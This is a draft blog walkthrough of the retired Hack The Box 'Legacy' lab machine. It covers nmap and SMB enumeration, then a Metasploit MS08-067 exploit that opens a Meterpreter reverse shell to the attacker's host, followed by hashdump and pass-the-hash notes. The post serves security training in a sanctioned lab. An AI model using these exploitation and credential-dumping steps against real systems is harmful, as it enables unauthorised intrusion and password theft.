--- 
layout: post 
title: Legacy HTB Writeup
date: 2020-05-15 018:00:00 -0400 
categories: InfoSec 
---

*some of this post is still being edited. Posting draft early by request.*

The Legacy HTB machine was one of the first HTB machines I ever broke into. It's a retired box that is pretty basic, leaning towards understanding basic methodology and how to make use of CVEs that you find on a box. It's a good start for practicing for the OSCP.  

![Website Screenshot](/assets/img/Walkthroughs/Legacy/Website_shot.png)

If this writeup isn't enough, HTB does include [a writeup](https://www.hackthebox.eu/home/machines/profile/2) on the site. There are also plenty of videos online how to do this box as well. 

**Okay let's get into it**


### Scanning the machine
So from HTB we already know the IP address is <code>10.10.10.4</code> so as long as our openvpn connection is setup we should be able to start banging on it.  

I'm going to scan this in a few different ways. First let's do a basic nmap. 

#### Basic nmap
```
nmap 10.10.10.4
```
or in case it has trouble
```
nmap -Pn 10.10.10.4
```

![Basic nmap scan](/assets/img/Walkthroughs/Legacy/basic_nmap.png) 
 

This scan will give us some basic information. It's good to do this scan first to see if there are any ports you can start to enumearte while waiting for larger scans.  
From this we can guess it might have something to do with SMB. How?  
**SMB**  
- [x] Has older SMB port 139. SMB used to run on 139 on top of netbios
- [x] Has newer SMB port 445. After Windows 2000, SMB was moved to this port.  
It's not enough for full confidence but it's enough to start to see where we might be going with this.  

 Let's run a couple bigger scans. 

**Note:** The next two scans can be run back to back but if you run the nmapAutomator.sh script, it includes the nmap scan I'm about to show you. 

#### "Big nmap" scan
I personally call this the big nmap. It's a scan that will scan all ports, and run anything it can against it.  
```
nmap -T4 -A -p- 10.10.10.4
```
I kept <code>-Pn</code> just because.

![big nmap ](/assets/img/Walkthroughs/Legacy/big_nmap.png) 

Before we run the next scan, lets go ahead and see what we can find from this. 
- Still looks like SMB
- SMB Security looks weak - <code>message_signing: disabled</code>
- Evidence that it is an older Windows machine, most likley XP. 
- Computer name is 'Legacy'
- Workgroup is 'HTB'
- Maybe possible to enumerate netbios
- Has directory services enabled

Okay let's run the nmapAutomator.sh scan. 

#### nmapAutomator.sh
Before we run this scan, let's talk about it a bit.  
nmapAutomator.sh is a bash script written by Github users **21y4d, austinsonger, and Knowledge_Wisdom_Understanding** and can be found on [Github here.](https://github.com/21y4d/nmapAutomator)  

It will run a handful of scans at the same time for you including: 
- sslscan
- nikto
- wpscan
- smbmap
- etc. 

So let's run a full scan and see how it goes.  
The scan is quite lengthy so I won't be posting a screenshot of the whole thing, but if you want to see the whole scan, you can watch it here. [![asciicast](https://asciinema.org/a/MnWeg5pekvWqu44AWeiSqOO9v.svg)](https://asciinema.org/a/MnWeg5pekvWqu44AWeiSqOO9v)  

This scan basically just confirmed what we found from previous scans. But it did give some paticularly interesting information on the SMB situation.
![SMB Vulnerabilities](/assets/img/Walkthroughs/Legacy/nmapauto_vulns.png)  

So now we know that this machine has two CVEs marked as vulnerable. 
- CVE-2008-4250
- CVE-2017-0143

At this point we could probably start poking at these CVEs but let's try to dig in a bit further before attacking the machine.  

#### Netbios enumeration
So with netbios there are a couple ways we can enumerate it. The first way is to run <code>nbtscan</code> on it to see what services we can see. We are looking for information about it being connected to a domain or a some sort of file server service. 
```
nbtscan -vh 10.10.10.4
```
After running this we see that it in fact has a file server service running as well as a few others listed. This is good information for us.  

![Nbtscan](/assets/img/Walkthroughs/Legacy/nbtscan.png)



#### SMB enumeration
Okay so when we ran our big nmap scan we got plenty of information on SMB but let's just run some SMB specific enumerations real fast just for the heck of it. Let's start with smbclient. 

```
smbclient -L //10.10.10.4///

```
smbclient is a small application similar to FTP. It may allow you to view files from the server. It also allows to put files on the server, view files, etc. In some cases you will be able to log in anonymously. 




Another way to enumerate SMB is to use nmap with the SMB script. We have already done this in the big nmap scan we did previously, but if you wanted to run it again it would look like this. 

```
nmap -p 445 --script smb-os-discovery 10.10.10.4
```

#### CVE-2008-4250
#### CVE-2017-0143
#### Exploitation and Gaining Access










metasploit scanning enum

```
search for smb enum
use auxiliary/scanner/smb/smb_version

msf5 > use auxiliary/scanner/smb/smb_version
msf5 auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

Name       Current Setting  Required  Description
----       ---------------  --------  -----------
RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
SMBDomain  .                no        The Windows domain to use for authentication
SMBPass                     no        The password for the specified username
SMBUser                     no        The username to authenticate as
THREADS    1                yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS
[-] Unknown variable
Usage: set [option] [value]

Set the given option to value.  If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore.  Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads'.

msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf5 auxiliary(scanner/smb/smb_version) > run

[+] 10.10.10.4:445        - Host is running Windows XP SP3 (language:English) (name:LEGACY) (workgroup:HTB ) (signatures:optional)
[*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Find version and look for exploits online. 

Doesn't find much. Hope that Old OS just have vulns

Search google for exploits. 

```
ms08-067 - SMB Windows XP service pack 3 vuln. 
```

```
msf5 auxiliary(scanner/smb/smb_version) > use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

Name     Current Setting  Required  Description
----     ---------------  --------  -----------
RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT    445              yes       The SMB service port (TCP)
SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Exploit target:

Id  Name
--  ----
0   Automatic Targeting

msf5 exploit(windows/smb/ms08_067_netapi) > rhosts 10.10.10.4
[-] Unknown command: rhosts.
msf5 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.10.10.4
rhosts => 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176195 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.10.10.4:1031) at 2020-05-11 23:01:23 -0400

meterpreter >
```

You can also use the PoC script and modify it to work and use that manually. 

### post exploit

check user. and system info (these are meterpreter commands)

```
getuid
then
sysinfo
```

you can do a hashdump to get the usernames and passwords for cracking later 

```
hashdump
```

you can do pass the hash stuff as well. 

you can navigate the machine with 

```
shell
```

Get the user and root.txt files

to cat out a file you use 

```
type filename.txt
```